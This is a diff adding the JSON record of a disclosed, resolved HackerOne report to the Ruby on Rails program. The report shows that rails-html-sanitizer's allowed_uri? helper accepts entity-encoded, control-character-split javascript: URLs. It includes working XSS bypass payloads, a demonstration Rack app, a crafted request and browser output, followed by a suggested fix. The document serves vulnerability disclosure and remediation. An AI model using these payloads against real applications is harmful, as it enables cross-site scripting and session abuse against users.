@@ -1,0 +1,130 @@
+{
+  "id": 3601655,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjAxNjU1",
+  "url": "https://hackerone.com/reports/3601655",
+  "title": "Rails::HTML::Sanitizer.allowed_uri? returns true for entity-encoded control-character-split javascript: URLs",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-12T22:55:40.790Z",
+  "submitted_at": "2026-03-12T22:55:41.277Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "smlee",
+    "url": "/smlee",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/680/490/5e41275cacf183da1e20c8b01713c9a88e2ab95f_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-04-18T15:27:19.842Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-03-19T15:27:13.276Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\n\n`Rails::HTML::Sanitizer.allowed_uri?` returns `true` for entity-encoded control-character-split `javascript:` URLs such as:\n\n- `java&#13;script:alert(1)`\n- `java&#10;script:alert(1)`\n- `jav&#9;ascript:alert(1)`\n\nWhen these values are rendered into `href` attributes, browsers normalize them to `javascript:` URLs and execute them on click.\n\nThis is not a bypass of the default `sanitize(...)` DOM-scrubbing path. The issue is specifically in the public URI-validation helper exposed by `rails-html-sanitizer`.\n\n# Affected Component\n\n- `rails-html-sanitizer`\n- `lib/rails/html/sanitizer.rb`\n- `Rails::HTML::Sanitizer.allowed_uri?`\n\nObserved on:\n\n- `rails-html-sanitizer 1.7.0`\n\nRelevant code:\n\n```ruby\n# lib/rails/html/sanitizer.rb\n\ndef allowed_uri?(uri_string)\n  Loofah::HTML5::Scrub.allowed_uri?(uri_string)\nend\n```\n\nThe delegated implementation is in Loofah:\n\n```ruby\n# loofah/lib/loofah/html5/scrub.rb\n\ndef allowed_uri?(uri_string)\n  val_unescaped = CGI.unescapeHTML(uri_string.gsub(CONTROL_CHARACTERS, \"\")).gsub(\"&colon;\", \":\").downcase\n  if URI_PROTOCOL_REGEX.match?(val_unescaped)\n    protocol = val_unescaped.split(SafeList::PROTOCOL_SEPARATOR)[0]\n    return false unless SafeList::ALLOWED_PROTOCOLS.include?(protocol)\n  end\n  true\nend\n```\n\n# Root Cause\n\nThe helper removes literal control characters before HTML entity decoding, but it does not remove control characters that appear only after decoding entities.\n\nAs a result:\n\n1. `java&#13;script:...` is decoded to `java\\rscript:...`\n2. the helper still returns `true`\n3. browsers normalize the value to `javascript:...`\n\nThis breaks the security expectation of a helper whose stated purpose is to validate URI attribute values before rendering.\n\n# Why This Matters\n\nThe helper is documented in code as a string-level URI safety check:\n\n```ruby\n# loofah/lib/loofah/html5/scrub.rb\n\n# Returns true if the given URI string is safe, false otherwise.\n# This method can be used to validate URI attribute values without\n# requiring a Nokogiri DOM node.\n```\n\nIn other words, this helper is meant to answer the security question:\n\n- “Can this string safely be used as a URI attribute value?”\n\nFor the payloads above, the current answer is `true`, but browsers treat the result as executable `javascript:`.\n\n# Important Scope Note\n\nThe default sanitization path is not being claimed as broken here.\n\nThe following still behaves safely:\n\n```ruby\nRails::HTML5::SafeListSanitizer.new.sanitize('<a href=\"java&#13;script:alert(1)\">x</a>')\n# => \"<a>x</a>\"\n```\n\nSo the issue is specifically:\n\n- `allowed_uri?` validation bypass\n- not a full `sanitize(...)` bypass\n\n# Preconditions / Threat Model\n\nExploitability requires:\n\n1. application code uses `Rails::HTML::Sanitizer.allowed_uri?` to validate a user-controlled URL\n2. if validation succeeds, the application renders that URL into an `href` or similar browser-interpreted URI attribute\n3. a user clicks the rendered link\n\nThis is therefore a framework-level validation bug with an application-dependent XSS path.\n\n# Runtime Reproduction\n\nMinimal helper probe:\n\n```ruby\nrequire \"rails-html-sanitizer\"\n\nputs Rails::HTML::Sanitizer.allowed_uri?(\"java&#13;script:alert(1)\")\nputs Rails::HTML::Sanitizer.allowed_uri?(\"java&#10;script:alert(1)\")\nputs Rails::HTML::Sanitizer.allowed_uri?(\"jav&#9;ascript:alert(1)\")\n```\n\nObserved output:\n\n```text\ntrue\ntrue\ntrue\n```\n\nAdditional sanity check:\n\n```ruby\nrequire \"rails-html-sanitizer\"\n\nsan = Rails::HTML5::SafeListSanitizer.new\nputs san.sanitize('<a href=\"java&#13;script:alert(1)\">x</a>')\n```\n\nObserved output:\n\n```text\n<a>x</a>\n```\n\nThis confirms the issue is in the helper, not the default DOM scrubber.\n\n# E2E Reproduction\n\nThe following minimal Rack app reproduces a realistic application pattern:\n\n- it accepts a user-controlled `next` URL\n- it validates that URL with `Rails::HTML::Sanitizer.allowed_uri?`\n- if validation succeeds, it renders a continuation link\n\nServer used:\n\n```ruby\nrequire \"rack\"\nrequire \"rails-html-sanitizer\"\n\napp = lambda do |env|\n  req = Rack::Request.new(env)\n\n  case [req.request_method, req.path_info]\n  when [\"GET\", \"/\"]\n    next_url = req.params[\"next\"].to_s\n    next_url = \"java&#13;script:document.title='owned';document.body.innerText='EXECUTED';void(0)\" if next_url.empty?\n    allowed = Rails::HTML::Sanitizer.allowed_uri?(next_url)\n\n    body = <<~HTML\n      <!doctype html>\n      <html>\n        <head>\n          <meta charset=\"utf-8\">\n          <title>allowed-uri-e2e</title>\n        </head>\n        <body>\n          <h1>Continue</h1>\n          <pre id=\"meta\">allowed=#{allowed.inspect}\\nnext=#{next_url.inspect}</pre>\n          #{allowed ? %(<a id=\"continue\" href=\"#{next_url}\">Continue</a>) : %(<p id=\"blocked\">Blocked</p>)}\n        </body>\n      </html>\n    HTML\n\n    [200, { \"content-type\" => \"text/html; charset=utf-8\" }, [body]]\n  else\n    [404, { \"content-type\" => \"text/plain; charset=utf-8\" }, [\"not found\"]]\n  end\nend\n\nrun app\n```\n\nExample raw request:\n\n```http\nGET /?next=java%26%2313%3Bscript%3Adocument.title%3D%27owned%27%3Bdocument.body.innerText%3D%27EXECUTED%27%3Bvoid(0) HTTP/1.1\nHost: 127.0.0.1:9442\nUser-Agent: curl/8.7.1\nAccept: */*\n```\n\nObserved raw response:\n\n```http\nHTTP/1.1 200 OK\ncontent-type: text/html; charset=utf-8\ncontent-length: 520\n\n<!doctype html>\n<html>\n  <head>\n    <meta charset=\"utf-8\">\n    <title>allowed-uri-e2e</title>\n  </head>\n  <body>\n    <h1>Continue</h1>\n    <pre id=\"meta\">allowed=true\nnext=\"java&#13;script:document.title='owned';document.body.innerText='EXECUTED';void(0)\"</pre>\n    <a id=\"continue\" href=\"java&#13;script:document.title='owned';document.body.innerText='EXECUTED';void(0)\">Continue</a>\n  </body>\n</html>\n```\n\nThe important point is:\n\n- the helper returns `allowed=true`\n- the unsafe link is rendered\n\n# Browser Confirmation\n\nWhen the above page is opened in Chrome, the DOM normalizes the rendered link as follows:\n\n```text\nattr     = \"java\\\\rscript:document.title='owned';document.body.innerText='EXECUTED';void(0)\"\nhref     = \"javascript:document.title='owned';document.body.innerText='EXECUTED';void(0)\"\nprotocol = \"javascript:\"\n```\n\nAfter clicking the rendered link:\n\n```text\ndocument.title = \"owned\"\ndocument.body.innerText = \"EXECUTED\"\n```\n\nalert('test') case capture:\n{F5522246}\n\nThis confirms that the helper-approved value becomes an executable `javascript:` URL in the browser.\n\n# Suggested Fix\n\n`allowed_uri?` should reject entity-encoded control-character-split schemes that browsers normalize into executable protocols.\n\nAt minimum:\n\n- decode HTML entities before the final control-character normalization step, or\n- strip control characters again after entity decoding, before protocol validation\n\nRegression tests should explicitly cover:\n\n- `java&#13;script:...`\n- `java&#10;script:...`\n- `jav&#9;ascript:...`\n\n# Notes\n\n- Root cause appears to be in the delegated Loofah helper implementation.\n- This report is scoped to the public Rails-exposed API `Rails::HTML::Sanitizer.allowed_uri?`.\n- This report does not claim that the default `sanitize(...)` path is bypassed.\n\n## Impact\n\nThis is a conditional XSS primitive through a public URI-validation helper.\n\nIf an application:\n\n1. validates user-controlled URLs with `Rails::HTML::Sanitizer.allowed_uri?`\n2. renders approved URLs into link targets or other browser-interpreted URI attributes\n3. relies on the helper’s boolean result as a security decision\n\nthen an attacker can supply values that the helper marks as allowed but that browsers execute as `javascript:`.\n\nPotential impact includes:\n\n- client-side code execution on click\n- token or sensitive-page data theft in affected flows\n- arbitrary actions in the user’s session\n- phishing / malicious continuation-link abuse",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5522246,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/duh3jf4w6ilhq5q39hlgtaahb1rg?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVKDNKVHF%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162131Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJHMEUCIDeSk1tdQ0EV3NNua5tLDSO10HWwtrDzJIFGbGDv45qqAiEA8ovGoh2x438CxGpv3O6IeOJbCGkBPGZvAQOwc4NN2oEqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDHIyQ%2BzYoQtkBCJdFCqOBVHLkq%2BsTaFu%2F%2BspTWsljX8iSkoVLzBM3raEyuv6osJZuGJD6TXpW9cNAorpX4lerrUeM%2Bfii%2BEiE5Uq%2FgiRThMwfwmYGyrxl9jUDtbdjiftivpFf6AhOtK4UZN5HiDYCLl%2B2OUgrExdyWYwO%2F%2Bv71kp3ZWnPQJoPsARE5mkuCsiHWPPsAY82hRK3AOBBX6cv6IBNOadNxGpo42csBkSlaMfpF0tquNtoUhaOvHYO%2BGK7zrRqYDUjyzhIAYCdWnx%2BQkAAdSH60utwW%2FvCy6iIIMcotwCojVHqRGJfB4a%2BUpg%2FeBGIhe62Qj1QRso1CyYyLLQC%2BFyDzfUH%2BJWEwcFqDVPaD0XpQygIL68weUOP%2FsHRjPWf5BiMSLo89ltrZjH0QaNAMVanDTZm3zzdeOUjEiRNo6u4M7atsrajV6C1%2Bxua4EnkpRj%2F1JS1OHFSUBGnXjjZO8%2BQ%2FWcpyPsluLOEOU%2BOXWbiVDW0pDAXjyCHNYNzylQhGipdd1wZmaNnEtd0DltmEeJEet7NP7Yom3T0CdJGoGlpLhtxWMBXhJnTRwVenQqpWJ7%2BgO54LlTltUciDDFT%2By%2FQV01QIybVo1anYuS9C8AdlkVFuyMFaN%2BbpSm%2BDSJxKmWQsRPeR52Ejof5%2BAfxzY5ZIYCUqKEIvcZIIWFL4Vwa4Vh7n1t27SA4qe3pZspJqxnrkLb3ToQsizgvCh0b%2F%2BoAZsSPLfIMTvB6xCHv%2B7KE496dTtUYIAwQcwej41gHRcLzXVGtNPSd3wjG8kF1JLoinxPUwyOebMERLnJrM21QbiltsmNOP46f9cdmeJnlUOF8BOVU9N%2BmRkNc4kXomMqtIz5CebmgfHGoPipGvRJpp9mBMg5NFDf%2FDCootjPBjqxAZW6n%2FuqrSboRJ9GHNWx5NU3D%2Fg3rqjIuwOa2W9%2FhTINATzu1CHPUl73UOT2pr3gK863B0s%2BTcCMXA%2BTqGJPcDgCUnrrd%2FewFfQ6U0yYVvDlDYFiia%2BesKZ%2FB1tqgJCulrjDDJEvm%2FVqZXQL%2F1aMqpvHAw3q5e5K0%2FF8COE8T6Wdb4vGnWOcaFEifJzNFe7V1UJ4z0ZsguYXDE1eI%2F1k0Eik8XiuWuyEMf7jnTjgoIWRLQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c57e1b1fefd503f0a73484fb5456c697b6d3d2176829fa615f6d917e5e3e4804",
+      "file_size": 69409,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-04-18T15:27:13.703Z",
+  "allow_singular_disclosure_after": -1212857.787314868,
+  "singular_disclosure_allowed": true,
+  "vote_count": 20,
+  "voters": [
+    "2026",
+    "mr0bxt",
+    "nwicks",
+    "whathehack81",
+    "r6rosinaldonevesr6",
+    "pradeep_",
+    "mohamski",
+    "d4r5h4n",
+    "redhatyyy",
+    "maturesh",
+    "and 10 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
